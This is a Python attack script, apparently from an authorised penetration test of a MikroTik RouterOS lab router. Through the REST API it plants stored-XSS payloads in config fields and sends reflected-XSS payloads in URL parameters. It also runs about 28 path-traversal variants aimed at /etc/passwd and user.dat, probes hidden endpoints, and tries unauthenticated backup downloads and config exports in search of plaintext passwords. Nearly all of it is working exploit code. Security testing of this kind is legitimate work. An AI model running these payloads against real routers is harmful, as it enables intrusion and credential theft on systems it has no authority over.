#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Deep WebFig XSS & Injection Hunter
Phase 9, Script 2 of 6
Target: [REDACTED-INTERNAL-IP]

Tests (~150):
  1. Stored XSS via config values (~40)
  2. Reflected XSS (~30)
  3. DOM-based XSS analysis (~20)
  4. Path traversal in static files (~30)
  5. Debug/hidden endpoints (~20)
  6. Backup file access (~10)

Evidence: evidence/novel_webfig_deep.json
"""

import json
import os
import re
import socket
import sys
import time
import traceback
import warnings
from urllib.parse import quote, quote_plus

warnings.filterwarnings("ignore")

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("novel_webfig_deep.py", phase=9)
HTTP_BASE = f"http://{TARGET}"
HTTPS_BASE = f"https://{TARGET}"
REST_BASE = f"http://{TARGET}/rest"

# Track objects for cleanup
CLEANUP = {
    "scripts": [],
    "identity_restore": None,
    "fw_rules": [],
    "comments_to_clear": [],
}


# ── Helpers ──────────────────────────────────────────────────────────────────

def rest_delete(path, timeout=10):
    """DELETE a REST API resource."""
    try:
        r = requests.delete(
            f"http://{TARGET}/rest{path}",
            auth=(ADMIN_USER, ADMIN_PASS),
            timeout=timeout, verify=False)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def get_webfig_page(path="/webfig/", auth=True, timeout=10):
    """Fetch a WebFig page and return (status, headers, body)."""
    try:
        kwargs = {"timeout": timeout, "verify": False}
        if auth:
            kwargs["auth"] = (ADMIN_USER, ADMIN_PASS)
        r = requests.get(f"{HTTP_BASE}{path}", **kwargs)
        return r.status_code, dict(r.headers), r.text
    except Exception as e:
        return 0, {}, str(e)


def check_xss_in_response(body, payload_marker):
    """Check if a payload marker appears unescaped in HTML response."""
    # Check if the raw payload is present
    raw_present = payload_marker in body
    # Check if it's inside an HTML-escaped context
    escaped_marker = (payload_marker.replace("<", "&lt;")
                                     .replace(">", "&gt;")
                                     .replace('"', "&quot;")
                                     .replace("'", "&#x27;"))
    escaped_present = escaped_marker in body

    return {
        "raw_present": raw_present,
        "escaped_present": escaped_present,
        "vulnerable": raw_present and not escaped_present,
    }


def periodic_health(test_count):
    """Check router health every 10 tests."""
    if test_count % 10 == 0 and test_count > 0:
        h = check_router_alive()
        if not h.get("alive"):
            log("  Router unreachable! Waiting for recovery...")
            wait_for_router(max_wait=60)
            return False
    return True


def cleanup_all():
    """Clean up all test artifacts."""
    log("Cleaning up test artifacts...")
    cleaned = 0

    # Restore identity
    if CLEANUP["identity_restore"]:
        rest_post("/system/identity/set", {"name": CLEANUP["identity_restore"]})
        cleaned += 1

    # Delete test scripts
    for sid in CLEANUP["scripts"]:
        try:
            rest_delete(f"/system/script/{sid}")
            cleaned += 1
        except Exception:
            pass

    # Delete test firewall rules
    for fid in CLEANUP["fw_rules"]:
        try:
            rest_delete(f"/ip/firewall/filter/{fid}")
            cleaned += 1
        except Exception:
            pass

    log(f"  Cleaned {cleaned} objects")


# =============================================================================
# Section 1: Stored XSS via Config Values (~40 tests)
# =============================================================================

def test_stored_xss():
    """Set XSS payloads in config values via REST, then check WebFig rendering."""
    log("=" * 60)
    log("Section 1: Stored XSS via Config Values")
    log("=" * 60)

    test_count = 0

    # Save original identity for restoration
    orig_code, orig_data = rest_get("/system/identity")
    if orig_code == 200 and isinstance(orig_data, dict):
        CLEANUP["identity_restore"] = orig_data.get("name", "MikroTik")

    xss_payloads = [
        ("script_tag", '<script>alert(1)</script>'),
        ("img_onerror", '<img src=x onerror=alert(1)>'),
        ("event_handler", '" onmouseover="alert(1)" data-x="'),
        ("svg_xss", '<svg onload=alert(1)>'),
        ("javascript_uri", 'javascript:alert(1)'),
        ("iframe_xss", '<iframe src="javascript:alert(1)">'),
        ("body_onload", '<body onload=alert(1)>'),
        ("input_autofocus", '<input autofocus onfocus=alert(1)>'),
        ("marquee_xss", '<marquee onstart=alert(1)>'),
        ("details_xss", '<details open ontoggle=alert(1)>'),
    ]

    # ── 1a: System identity ──────────────────────────────────────────────────
    log("  Testing stored XSS via system identity...")
    for name, payload in xss_payloads:
        test_count += 1
        periodic_health(test_count)

        try:
            # Set the identity via REST
            code, resp = rest_post("/system/identity/set", {"name": payload})
            if code not in [200, 201]:
                ec.add_test(
                    "stored_xss", f"Identity XSS: {name}",
                    f"Set system identity to XSS payload ({name})",
                    f"SET rejected: HTTP {code}",
                    {"payload": payload, "set_status": code,
                     "response": str(resp)[:300]},
                )
                continue

            # Fetch WebFig and check if payload is rendered unescaped
            time.sleep(0.5)
            wf_status, wf_headers, wf_body = get_webfig_page("/webfig/")
            xss_check = check_xss_in_response(wf_body, payload)

            ec.add_test(
                "stored_xss", f"Identity XSS: {name}",
                f"Set identity to '{name}' payload, check WebFig rendering",
                f"Set OK, WebFig status={wf_status}, "
                f"raw={xss_check['raw_present']}, escaped={xss_check['escaped_present']}",
                {"payload": payload, "set_status": code,
                 "webfig_status": wf_status,
                 "xss_check": xss_check,
                 "body_snippet": wf_body[:500]},
                anomaly=xss_check["vulnerable"],
            )

            if xss_check["vulnerable"]:
                ec.add_finding(
                    "HIGH",
                    f"Stored XSS via system identity ({name})",
                    f"Setting system identity to '{payload}' results in unescaped "
                    f"rendering in WebFig interface",
                    cwe="CWE-79", cvss=6.1,
                    reproduction_steps=[
                        f"1. REST: POST /rest/system/identity/set with name={payload}",
                        "2. Browse to /webfig/",
                        "3. Payload renders unescaped in page source",
                    ],
                )

        except Exception as e:
            ec.add_test("stored_xss", f"Identity XSS: {name}",
                        f"Identity XSS test", f"Error: {e}")

    # Restore identity
    if CLEANUP["identity_restore"]:
        rest_post("/system/identity/set", {"name": CLEANUP["identity_restore"]})

    # ── 1b: Interface comments ───────────────────────────────────────────────
    log("  Testing stored XSS via interface comments...")
    # Get first interface
    iface_code, iface_data = rest_get("/interface")
    iface_id = None
    orig_comment = ""
    if iface_code == 200 and isinstance(iface_data, list) and iface_data:
        iface_id = iface_data[0].get(".id")
        orig_comment = iface_data[0].get("comment", "")

    if iface_id:
        for name, payload in xss_payloads[:5]:  # Test top 5
            test_count += 1
            periodic_health(test_count)

            try:
                code, resp = rest_patch(
                    f"/interface/{iface_id}",
                    {"comment": payload},
                )
                if code in [200, 201]:
                    time.sleep(0.3)
                    wf_status, _, wf_body = get_webfig_page("/webfig/")
                    xss_check = check_xss_in_response(wf_body, payload)

                    ec.add_test(
                        "stored_xss", f"Interface comment XSS: {name}",
                        f"Set interface comment to '{name}' payload",
                        f"raw={xss_check['raw_present']}, escaped={xss_check['escaped_present']}",
                        {"payload": payload, "xss_check": xss_check},
                        anomaly=xss_check["vulnerable"],
                    )
                    if xss_check["vulnerable"]:
                        ec.add_finding(
                            "HIGH",
                            f"Stored XSS via interface comment ({name})",
                            f"Setting interface comment to '{payload}' renders unescaped in WebFig",
                            cwe="CWE-79", cvss=6.1,
                        )
                else:
                    ec.add_test(
                        "stored_xss", f"Interface comment XSS: {name}",
                        f"Set interface comment", f"SET rejected: HTTP {code}",
                        {"payload": payload, "status": code},
                    )
            except Exception as e:
                ec.add_test("stored_xss", f"Interface comment XSS: {name}",
                            f"Interface comment XSS test", f"Error: {e}")

        # Restore original comment
        rest_patch(f"/interface/{iface_id}", {"comment": orig_comment})

    # ── 1c: Firewall rule comments ───────────────────────────────────────────
    log("  Testing stored XSS via firewall rule comments...")
    for name, payload in xss_payloads[:5]:
        test_count += 1
        periodic_health(test_count)

        try:
            code, resp = rest_post(
                "/ip/firewall/filter/add",
                {"chain": "forward", "action": "accept",
                 "comment": payload, "disabled": "true"},
            )
            if code in [200, 201] and isinstance(resp, dict):
                fw_id = resp.get("ret") or resp.get(".id")
                if fw_id:
                    CLEANUP["fw_rules"].append(fw_id)

                time.sleep(0.3)
                wf_status, _, wf_body = get_webfig_page("/webfig/")
                xss_check = check_xss_in_response(wf_body, payload)

                ec.add_test(
                    "stored_xss", f"Firewall comment XSS: {name}",
                    f"Create firewall rule with XSS comment ({name})",
                    f"Rule created, raw={xss_check['raw_present']}",
                    {"payload": payload, "xss_check": xss_check},
                    anomaly=xss_check["vulnerable"],
                )
            else:
                ec.add_test(
                    "stored_xss", f"Firewall comment XSS: {name}",
                    f"Create FW rule with XSS comment",
                    f"Creation failed: HTTP {code}",
                )
        except Exception as e:
            ec.add_test("stored_xss", f"Firewall comment XSS: {name}",
                        f"FW comment XSS test", f"Error: {e}")

    # ── 1d: SNMP contact/location ────────────────────────────────────────────
    log("  Testing stored XSS via SNMP fields...")
    snmp_fields = [
        ("contact", "SNMP contact"),
        ("location", "SNMP location"),
    ]
    for field, desc in snmp_fields:
        for name, payload in xss_payloads[:3]:
            test_count += 1
            try:
                code, resp = rest_post(
                    "/snmp/set",
                    {field: payload},
                )
                ec.add_test(
                    "stored_xss", f"SNMP {field} XSS: {name}",
                    f"Set SNMP {desc} to '{name}' payload",
                    f"HTTP {code}",
                    {"field": field, "payload": payload, "status": code},
                )
            except Exception as e:
                ec.add_test("stored_xss", f"SNMP {field} XSS: {name}",
                            f"SNMP XSS test", f"Error: {e}")

    # Restore SNMP fields
    try:
        rest_post("/snmp/set", {"contact": "", "location": ""})
    except Exception:
        pass


# =============================================================================
# Section 2: Reflected XSS (~30 tests)
# =============================================================================

def test_reflected_xss():
    """Test for reflected XSS in WebFig URL parameters and paths."""
    log("=" * 60)
    log("Section 2: Reflected XSS")
    log("=" * 60)

    test_count = 0

    xss_vectors = [
        ("script_tag", "<script>alert(1)</script>"),
        ("img_onerror", "<img src=x onerror=alert(1)>"),
        ("svg_onload", "<svg onload=alert(1)>"),
        ("event_handler", '" onmouseover="alert(1)'),
        ("javascript_uri", "javascript:alert(1)"),
    ]

    # ── 2a: URL parameter injection on WebFig ────────────────────────────────
    webfig_params = [
        "/webfig/?param={PAYLOAD}",
        "/webfig/?search={PAYLOAD}",
        "/webfig/?q={PAYLOAD}",
        "/webfig/?redirect={PAYLOAD}",
        "/webfig/?return={PAYLOAD}",
        "/webfig/?next={PAYLOAD}",
        "/webfig/?error={PAYLOAD}",
        "/webfig/?msg={PAYLOAD}",
        "/webfig/?lang={PAYLOAD}",
        "/webfig/?skin={PAYLOAD}",
    ]

    for url_template in webfig_params:
        for xss_name, xss_payload in xss_vectors[:3]:  # Top 3 per param
            test_count += 1
            periodic_health(test_count)

            url_path = url_template.replace("{PAYLOAD}", quote(xss_payload))
            try:
                r = requests.get(
                    f"{HTTP_BASE}{url_path}",
                    auth=(ADMIN_USER, ADMIN_PASS),
                    timeout=10, verify=False,
                )
                xss_check = check_xss_in_response(r.text, xss_payload)
                ec.add_test(
                    "reflected_xss",
                    f"Reflected: {url_template[:40]} + {xss_name}",
                    f"Test reflected XSS via URL parameter",
                    f"HTTP {r.status_code}, raw={xss_check['raw_present']}",
                    {"url": url_path[:200], "xss_name": xss_name,
                     "status": r.status_code, "xss_check": xss_check},
                    anomaly=xss_check["vulnerable"],
                )
                if xss_check["vulnerable"]:
                    ec.add_finding(
                        "HIGH",
                        f"Reflected XSS in WebFig URL parameter",
                        f"Payload '{xss_payload}' reflected unescaped at {url_template}",
                        cwe="CWE-79", cvss=6.1,
                    )
            except Exception as e:
                ec.add_test("reflected_xss", f"Reflected: {url_template[:40]}",
                            "Reflected XSS test", f"Error: {e}")

    # ── 2b: jsproxy reflected XSS ────────────────────────────────────────────
    log("  Testing reflected XSS via /jsproxy/...")
    jsproxy_tests = [
        "/jsproxy?query={PAYLOAD}",
        "/jsproxy/?q={PAYLOAD}",
        "/jsproxy/{PAYLOAD}",
    ]
    for url_template in jsproxy_tests:
        for xss_name, xss_payload in xss_vectors[:2]:
            test_count += 1
            url_path = url_template.replace("{PAYLOAD}", quote(xss_payload))
            try:
                r = requests.get(
                    f"{HTTP_BASE}{url_path}",
                    timeout=10, verify=False,
                )
                xss_check = check_xss_in_response(r.text, xss_payload)
                ec.add_test(
                    "reflected_xss",
                    f"jsproxy reflected: {xss_name}",
                    f"Test reflected XSS via jsproxy",
                    f"HTTP {r.status_code}, raw={xss_check['raw_present']}",
                    {"url": url_path[:200], "status": r.status_code,
                     "xss_check": xss_check},
                    anomaly=xss_check["vulnerable"],
                )
            except Exception as e:
                ec.add_test("reflected_xss", f"jsproxy reflected: {xss_name}",
                            "jsproxy XSS test", f"Error: {e}")

    # ── 2c: Error page injection ─────────────────────────────────────────────
    log("  Testing XSS in error pages...")
    error_paths = [
        f"/nonexistent_{xss_vectors[0][1]}",
        f"/webfig/nonexistent?err={quote(xss_vectors[0][1])}",
        f"/rest/nonexistent/{quote(xss_vectors[1][1])}",
    ]
    for path in error_paths:
        test_count += 1
        try:
            r = requests.get(
                f"{HTTP_BASE}{path}",
                timeout=10, verify=False,
            )
            # Check for any XSS payload in error page
            has_xss = any(v[1] in r.text for v in xss_vectors[:2])
            ec.add_test(
                "reflected_xss", f"Error page XSS: {path[:60]}",
                f"Test XSS reflection in error page",
                f"HTTP {r.status_code}, xss_reflected={has_xss}",
                {"path": path[:200], "status": r.status_code,
                 "xss_reflected": has_xss, "body_preview": r.text[:300]},
                anomaly=has_xss,
            )
        except Exception as e:
            ec.add_test("reflected_xss", f"Error page XSS",
                        "Error page XSS test", f"Error: {e}")


# =============================================================================
# Section 3: DOM-based XSS Analysis (~20 tests)
# =============================================================================

def test_dom_xss():
    """Analyze WebFig JavaScript for DOM-based XSS sinks."""
    log("=" * 60)
    log("Section 3: DOM-based XSS Analysis")
    log("=" * 60)

    test_count = 0

    # Fetch WebFig page and extract JS files
    wf_status, wf_headers, wf_body = get_webfig_page("/webfig/")
    if wf_status != 200:
        ec.add_test("dom_xss", "WebFig page fetch",
                    "Fetch WebFig page for JS analysis",
                    f"Failed: HTTP {wf_status}", anomaly=True)
        return

    # Find all JS file references
    js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', wf_body)
    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', wf_body, re.DOTALL)

    ec.add_test("dom_xss", "JS file enumeration",
                "Extract JavaScript file references from WebFig",
                f"Found {len(js_files)} JS files, {len(inline_scripts)} inline scripts",
                {"js_files": js_files, "inline_script_count": len(inline_scripts),
                 "inline_sizes": [len(s) for s in inline_scripts]})

    # DOM XSS sink patterns to search for
    dom_sinks = [
        ("innerHTML", r'\.innerHTML\s*='),
        ("outerHTML", r'\.outerHTML\s*='),
        ("document.write", r'document\.write\s*\('),
        ("document.writeln", r'document\.writeln\s*\('),
        ("eval", r'[^a-zA-Z]eval\s*\('),
        ("setTimeout_string", r'setTimeout\s*\(\s*["\']'),
        ("setInterval_string", r'setInterval\s*\(\s*["\']'),
        ("Function_constructor", r'new\s+Function\s*\('),
        ("location.href_set", r'location\.href\s*='),
        ("location.hash", r'location\.hash'),
        ("location.search", r'location\.search'),
        ("document.referrer", r'document\.referrer'),
        ("postMessage", r'\.postMessage\s*\('),
        ("addEventListener_message", r'addEventListener\s*\(\s*["\']message'),
        ("jQuery.html", r'\.html\s*\('),
        ("jQuery.append", r'\.append\s*\('),
    ]

    # Analyze inline scripts
    all_js_content = "\n".join(inline_scripts)
    inline_findings = {}
    for sink_name, pattern in dom_sinks:
        matches = re.findall(pattern, all_js_content)
        if matches:
            inline_findings[sink_name] = len(matches)

    ec.add_test("dom_xss", "Inline script sink analysis",
                "Search for DOM XSS sinks in inline JavaScript",
                f"Found sinks: {list(inline_findings.keys())}",
                {"sinks_found": inline_findings,
                 "total_sinks": sum(inline_findings.values())},
                anomaly=len(inline_findings) > 3)

    if "innerHTML" in inline_findings or "eval" in inline_findings:
        ec.add_finding(
            "MEDIUM",
            "DOM XSS sinks in inline JavaScript",
            f"WebFig inline JavaScript contains dangerous sinks: {list(inline_findings.keys())}",
            cwe="CWE-79",
        )

    # Fetch and analyze external JS files
    for js_path in js_files[:10]:  # Limit to 10 files
        test_count += 1
        periodic_health(test_count)

        # Normalize path
        if js_path.startswith("/"):
            js_url = f"{HTTP_BASE}{js_path}"
        elif js_path.startswith("http"):
            js_url = js_path
        else:
            js_url = f"{HTTP_BASE}/webfig/{js_path}"

        try:
            r = requests.get(js_url, auth=(ADMIN_USER, ADMIN_PASS),
                            timeout=10, verify=False)
            if r.status_code == 200:
                js_content = r.text
                file_findings = {}
                for sink_name, pattern in dom_sinks:
                    matches = re.findall(pattern, js_content)
                    if matches:
                        file_findings[sink_name] = len(matches)

                ec.add_test("dom_xss", f"JS file sinks: {js_path[:50]}",
                            f"Analyze {js_path} for DOM XSS sinks",
                            f"Size={len(js_content)}, sinks={list(file_findings.keys())}",
                            {"file": js_path, "size": len(js_content),
                             "sinks_found": file_findings},
                            anomaly=bool(file_findings))
            else:
                ec.add_test("dom_xss", f"JS file: {js_path[:50]}",
                            f"Fetch JS file", f"HTTP {r.status_code}")
        except Exception as e:
            ec.add_test("dom_xss", f"JS file: {js_path[:50]}",
                        "Fetch JS file", f"Error: {e}")

    # ── 3b: Test location.hash-based DOM XSS ────────────────────────────────
    hash_payloads = [
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "#javascript:alert(1)",
        "#';alert(1)//",
    ]
    for payload in hash_payloads:
        test_count += 1
        ec.add_test("dom_xss", f"Hash payload: {payload[:40]}",
                    f"Test DOM XSS via location.hash",
                    "Cannot verify DOM execution via automated request — "
                    "requires browser-based testing",
                    {"payload": payload,
                     "note": "Location.hash not sent to server; "
                             "manual browser testing required"})

    # ── 3c: Security headers analysis ────────────────────────────────────────
    security_headers = {
        "Content-Security-Policy": wf_headers.get("Content-Security-Policy", ""),
        "X-Content-Type-Options": wf_headers.get("X-Content-Type-Options", ""),
        "X-Frame-Options": wf_headers.get("X-Frame-Options", ""),
        "X-XSS-Protection": wf_headers.get("X-XSS-Protection", ""),
        "Referrer-Policy": wf_headers.get("Referrer-Policy", ""),
        "Permissions-Policy": wf_headers.get("Permissions-Policy", ""),
    }
    missing = [k for k, v in security_headers.items() if not v]

    ec.add_test("dom_xss", "Security headers analysis",
                "Check for XSS-preventing security headers on WebFig",
                f"Missing headers: {missing}",
                {"headers": security_headers, "missing": missing},
                anomaly=len(missing) > 2)

    if "Content-Security-Policy" in missing:
        ec.add_finding(
            "MEDIUM",
            "Missing Content-Security-Policy header on WebFig",
            f"WebFig does not set CSP header. Missing headers: {', '.join(missing)}",
            cwe="CWE-693",
        )


# =============================================================================
# Section 4: Path Traversal in Static Files (~30 tests)
# =============================================================================

def test_path_traversal():
    """Test path traversal in WebFig static file serving."""
    log("=" * 60)
    log("Section 4: Path Traversal in Static Files")
    log("=" * 60)

    test_count = 0

    traversal_paths = [
        # Basic traversal
        "/webfig/../../etc/passwd",
        "/webfig/../../../etc/passwd",
        "/webfig/../../../../etc/passwd",
        "/webfig/../../../rw/store/user.dat",

        # URL-encoded traversal
        "/webfig/%2e%2e/%2e%2e/etc/passwd",
        "/webfig/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "/webfig/..%2f..%2f..%2fetc/passwd",

        # Double URL encoding
        "/webfig/%252e%252e/%252e%252e/etc/passwd",
        "/webfig/..%252f..%252f..%252fetc/passwd",

        # Null byte injection
        "/webfig/../../etc/passwd%00.js",
        "/webfig/../../etc/passwd%00.html",
        "/webfig/../../etc/passwd\x00.css",

        # Overlong UTF-8
        "/webfig/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",

        # Backslash variants (Windows-style)
        "/webfig/..\\..\\..\\etc\\passwd",
        "/webfig/..%5c..%5c..%5cetc%5cpasswd",

        # Skins directory traversal
        "/skins/../../../etc/passwd",
        "/skins/%2e%2e/%2e%2e/etc/passwd",
        "/skins/../../../rw/store/",

        # Graphs directory traversal
        "/graphs/../../../etc/passwd",
        "/graphs/%2e%2e/%2e%2e/etc/passwd",
        "/graphs/../rw/store/user.dat",

        # Mixed techniques
        "/webfig/....//....//....//etc/passwd",
        "/webfig/..;/..;/etc/passwd",
        "/webfig/.%00./..%00./etc/passwd",

        # RouterOS-specific paths
        "/webfig/../nova/etc/",
        "/webfig/../flash/nova/etc/passwd",
        "/webfig/../rw/store/user.dat",
        "/webfig/../rw/logs/",
    ]

    sensitive_content = ["root:", "passwd:", "shadow:", "bin/", "/sbin",
                         "user.dat", "password", "nova"]

    for path in traversal_paths:
        test_count += 1
        periodic_health(test_count)

        try:
            r = requests.get(
                f"{HTTP_BASE}{path}",
                auth=(ADMIN_USER, ADMIN_PASS),
                timeout=10, verify=False,
                allow_redirects=False,
            )
            has_sensitive = any(kw in r.text.lower() for kw in sensitive_content)
            is_success = r.status_code == 200 and has_sensitive

            ec.add_test(
                "path_traversal", f"Traversal: {path[:60]}",
                f"Test path traversal: {path[:60]}",
                f"HTTP {r.status_code}, size={len(r.content)}, "
                f"sensitive={has_sensitive}",
                {"path": path, "status": r.status_code,
                 "body_size": len(r.content),
                 "has_sensitive_content": has_sensitive,
                 "body_preview": r.text[:500] if has_sensitive else r.text[:100]},
                anomaly=is_success,
            )

            if is_success:
                ec.add_finding(
                    "CRITICAL",
                    f"Path traversal in WebFig: {path[:60]}",
                    f"GET {path} returned sensitive content (HTTP {r.status_code})",
                    cwe="CWE-22", cvss=9.1,
                    reproduction_steps=[
                        f"1. GET http://{TARGET}{path}",
                        "2. Response contains sensitive file content",
                    ],
                )
        except Exception as e:
            ec.add_test("path_traversal", f"Traversal: {path[:60]}",
                        f"Path traversal test", f"Error: {e}")


# =============================================================================
# Section 5: Debug/Hidden Endpoints (~20 tests)
# =============================================================================

def test_debug_endpoints():
    """Probe for debug, status, and hidden endpoints."""
    log("=" * 60)
    log("Section 5: Debug/Hidden Endpoints")
    log("=" * 60)

    test_count = 0

    debug_paths = [
        # Standard debug endpoints
        "/debug", "/trace", "/status", "/health", "/info",
        "/metrics", "/env", "/actuator", "/actuator/health",
        "/actuator/env", "/actuator/info",

        # API documentation
        "/swagger", "/swagger-ui", "/swagger.json",
        "/api-docs", "/openapi", "/openapi.json",

        # Version control
        "/.git/", "/.git/config", "/.git/HEAD",
        "/.svn/", "/.svn/entries",

        # Config files
        "/.env", "/.htaccess", "/.htpasswd",
        "/config.json", "/config.yaml", "/config.xml",

        # Robot/crawler files
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/clientaccesspolicy.xml",

        # RouterOS-specific
        "/winbox/", "/winbox/index.html",
        "/webfig/mikrotik.ico",
        "/webfig/manifest.json",
        "/skins/", "/graphs/",
        "/jsproxy/config",

        # Firmware/package
        "/up[REDACTED]", "/firmware", "/backup",
        "/system/backup", "/system/export",
    ]

    discovered = []
    for path in debug_paths:
        test_count += 1
        periodic_health(test_count)

        try:
            # Test both with and without auth
            for auth_label, auth in [("auth", (ADMIN_USER, ADMIN_PASS)), ("noauth", None)]:
                r = requests.get(
                    f"{HTTP_BASE}{path}",
                    auth=auth,
                    timeout=8, verify=False,
                    allow_redirects=False,
                )

                interesting = (r.status_code == 200 and len(r.content) > 0)
                if interesting:
                    discovered.append({
                        "path": path, "status": r.status_code,
                        "size": len(r.content), "auth": auth_label,
                        "content_type": r.headers.get("Content-Type", ""),
                    })

                ec.add_test(
                    "debug_endpoints",
                    f"Debug probe ({auth_label}): {path}",
                    f"Probe for {path} ({'with' if auth else 'without'} auth)",
                    f"HTTP {r.status_code}, size={len(r.content)}",
                    {"path": path, "auth": auth_label,
                     "status": r.status_code, "size": len(r.content),
                     "content_type": r.headers.get("Content-Type", ""),
                     "body_preview": r.text[:200] if interesting else ""},
                    anomaly=(interesting and auth_label == "noauth" and
                             path in ("/.env", "/.git/config", "/.htpasswd")),
                )

                # Only test noauth if auth also works
                if r.status_code != 200:
                    break

        except Exception as e:
            ec.add_test("debug_endpoints", f"Debug probe: {path}",
                        f"Probe {path}", f"Error: {e}")

    # Summary
    ec.add_test(
        "debug_endpoints", "Discovery summary",
        f"Summary of discovered hidden/debug endpoints",
        f"Found {len(discovered)} accessible endpoints",
        {"discovered": discovered},
    )


# =============================================================================
# Section 6: Backup File Access (~10 tests)
# =============================================================================

def test_backup_access():
    """Test backup file creation and access."""
    log("=" * 60)
    log("Section 6: Backup File Access")
    log("=" * 60)

    test_count = 0

    # ── 6a: List existing files ──────────────────────────────────────────────
    code, files = rest_get("/file")
    backup_files = []
    if code == 200 and isinstance(files, list):
        for f in files:
            name = f.get("name", "")
            if any(ext in name.lower() for ext in [".backup", ".rsc", ".npk"]):
                backup_files.append(f)

        ec.add_test("backup_access", "File listing",
                    "List all files on router filesystem",
                    f"Found {len(files)} files, {len(backup_files)} backup/config files",
                    {"total_files": len(files),
                     "backup_files": backup_files,
                     "all_files": [f.get("name", "") for f in files]})
    else:
        ec.add_test("backup_access", "File listing",
                    "List files on router", f"Failed: HTTP {code}",
                    anomaly=True)

    # ── 6b: Create backup and analyze ────────────────────────────────────────
    log("  Creating backup file...")
    try:
        code, resp = rest_post("/system/backup/save",
                               {"name": "_novel_test_backup"})
        ec.add_test("backup_access", "Create backup",
                    "Create system backup via REST API",
                    f"HTTP {code}",
                    {"status": code, "response": str(resp)[:300]})

        if code in [200, 201]:
            time.sleep(2)
            # Check if backup file appeared
            code2, files2 = rest_get("/file")
            if code2 == 200 and isinstance(files2, list):
                backup = [f for f in files2 if "_novel_test_backup" in f.get("name", "")]
                if backup:
                    backup_info = backup[0]
                    ec.add_test("backup_access", "Backup file details",
                                "Analyze created backup file",
                                f"File: {backup_info.get('name')}, "
                                f"Size: {backup_info.get('size')}",
                                {"file": backup_info})

                    # Try to download via WebFig
                    fname = backup_info.get("name", "")
                    download_paths = [
                        f"/webfig/backup/{fname}",
                        f"/{fname}",
                        f"/rest/file/{fname}",
                    ]
                    for dl_path in download_paths:
                        test_count += 1
                        try:
                            r = requests.get(
                                f"{HTTP_BASE}{dl_path}",
                                auth=(ADMIN_USER, ADMIN_PASS),
                                timeout=10, verify=False,
                            )
                            ec.add_test("backup_access",
                                        f"Download backup: {dl_path[:50]}",
                                        f"Attempt to download backup via {dl_path}",
                                        f"HTTP {r.status_code}, size={len(r.content)}",
                                        {"path": dl_path, "status": r.status_code,
                                         "size": len(r.content)})
                        except Exception as e:
                            ec.add_test("backup_access",
                                        f"Download backup: {dl_path[:50]}",
                                        "Download backup", f"Error: {e}")

                    # Try without auth
                    for dl_path in download_paths:
                        test_count += 1
                        try:
                            r = requests.get(
                                f"{HTTP_BASE}{dl_path}",
                                timeout=10, verify=False,
                            )
                            accessible = r.status_code == 200 and len(r.content) > 100
                            ec.add_test("backup_access",
                                        f"Unauth backup: {dl_path[:50]}",
                                        f"Download backup without auth via {dl_path}",
                                        f"HTTP {r.status_code}, accessible={accessible}",
                                        {"path": dl_path, "status": r.status_code,
                                         "accessible": accessible},
                                        anomaly=accessible)
                            if accessible:
                                ec.add_finding(
                                    "HIGH",
                                    f"Backup file accessible without auth: {dl_path}",
                                    f"Backup file downloadable without authentication",
                                    cwe="CWE-538",
                                )
                        except Exception as e:
                            ec.add_test("backup_access",
                                        f"Unauth backup: {dl_path[:50]}",
                                        "Unauth backup download", f"Error: {e}")

                    # Clean up backup file
                    try:
                        backup_id = backup_info.get(".id")
                        if backup_id:
                            rest_delete(f"/file/{backup_id}")
                    except Exception:
                        pass

    except Exception as e:
        ec.add_test("backup_access", "Create backup",
                    "Backup creation test", f"Error: {e}")

    # ── 6c: Export configuration ─────────────────────────────────────────────
    log("  Testing configuration export...")
    try:
        code, resp = rest_post("/export", {})
        ec.add_test("backup_access", "Export config via REST",
                    "Test /export endpoint via REST API",
                    f"HTTP {code}",
                    {"status": code, "response": str(resp)[:500]})
    except Exception as e:
        ec.add_test("backup_access", "Export config",
                    "Config export test", f"Error: {e}")

    # Try SSH export
    try:
        stdout, stderr, rc = ssh_command("/export")
        has_passwords = any(kw in stdout.lower()
                           for kw in ["password", "secret", "key"])
        ec.add_test("backup_access", "SSH export config",
                    "Export configuration via SSH",
                    f"RC={rc}, size={len(stdout)}, has_passwords={has_passwords}",
                    {"returncode": rc, "output_size": len(stdout),
                     "has_passwords": has_passwords,
                     "output_preview": stdout[:500]},
                    anomaly=has_passwords)
        if has_passwords:
            ec.add_finding(
                "MEDIUM",
                "Configuration export contains passwords",
                "SSH /export command outputs password fields in plaintext",
                cwe="CWE-312",
            )
    except Exception as e:
        ec.add_test("backup_access", "SSH export config",
                    "SSH export test", f"Error: {e}")


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — Deep WebFig XSS & Injection")
    log(f"Target: {TARGET}")
    log("Phase 9 — novel_webfig_deep.py")
    log("=" * 60)

    alive = check_router_alive()
    if not alive.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        return
    log(f"Router alive: version={alive.get('version')}, uptime={alive.get('uptime')}")

    try:
        test_stored_xss()        # ~40 tests
        test_reflected_xss()     # ~30 tests
        test_dom_xss()           # ~20 tests
        test_path_traversal()    # ~30 tests
        test_debug_endpoints()   # ~20 tests
        test_backup_access()     # ~10 tests

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        traceback.print_exc()
    finally:
        log("=" * 60)
        log("Post-test cleanup")
        log("=" * 60)
        cleanup_all()

        final = check_router_alive()
        log(f"Final health: {final}")

        ec.save("novel_webfig_deep.json")
        ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
